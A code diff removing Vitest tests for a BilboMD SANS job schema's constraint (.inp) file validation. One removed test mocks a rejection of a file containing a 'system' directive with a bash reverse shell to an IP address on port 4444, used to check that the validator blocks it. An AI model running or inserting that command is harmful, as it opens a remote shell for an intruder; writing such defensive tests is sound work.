@@ -165,61 +165,6 @@ describe('BilboMDSANSJobSchema - dat_file', () => {
   })
 })
 
-describe('BilboMDSANSJobSchema - inp_file', () => {
-  it('accepts valid .inp file under 2MB', async () => {
-    const file = makeFile('const.inp')
-    await expect(
-      BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
-    ).resolves.toBe(file)
-  })
-
-  it('checks segment IDs with the PDB rule', async () => {
-    const file = makeFile('const.inp')
-    await BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
-    expect(ValidationFunctions.isValidConstInpFile).toHaveBeenCalledWith(
-      file,
-      'pdb'
-    )
-  })
-
-  it('rejects inp_file containing a system directive (reverse shell exploit)', async () => {
-    vi.mocked(ValidationFunctions.isValidConstInpFile).mockResolvedValueOnce(
-      'Disallowed keyword in constraint file: "system "bash -i >& /dev/tcp/173.230.129.114/4444 0>&1""'
-    )
-    const file = makeFile('const.inp')
-    await expect(
-      BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
-    ).rejects.toThrow('Disallowed keyword')
-  })
-
-  it('rejects non-.inp extension', async () => {
-    const file = makeFile('const.txt')
-    await expect(
-      BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
-    ).rejects.toThrow('Only accepts a *.inp file.')
-  })
-
-  it('rejects file over 2MB', async () => {
-    const file = makeFile('const.inp', 2_000_001)
-    await expect(
-      BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
-    ).rejects.toThrow('Max file size is 2MB')
-  })
-
-  it('rejects filename longer than 30 characters', async () => {
-    const file = makeFile('a'.repeat(27) + '.inp')
-    await expect(
-      BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
-    ).rejects.toThrow('no longer than 30 characters')
-  })
-
-  it('rejects missing inp_file', async () => {
-    await expect(
-      BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: undefined })
-    ).rejects.toBeTruthy()
-  })
-})
-
 describe('BilboMDSANSJobSchema - rg_min', () => {
   it('accepts value between 10 and 100', async () => {
     await expect(
